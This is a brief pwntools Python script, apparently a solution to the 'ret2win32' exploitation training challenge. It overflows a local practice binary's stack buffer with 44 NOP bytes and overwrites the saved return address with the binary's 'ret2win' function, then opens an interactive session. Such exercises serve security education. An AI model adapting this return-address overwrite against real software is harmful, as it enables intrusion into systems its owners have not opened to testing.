from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./ret2win32', checksec=False)
p = process()

padding = 44

payload = flat(
    asm('nop') * padding,  # Padding to EIP
    elf.symbols['ret2win'],  # win_function - 0x804862c
)

write("payload", payload)

p.sendlineafter('>', payload)
p.interactive()
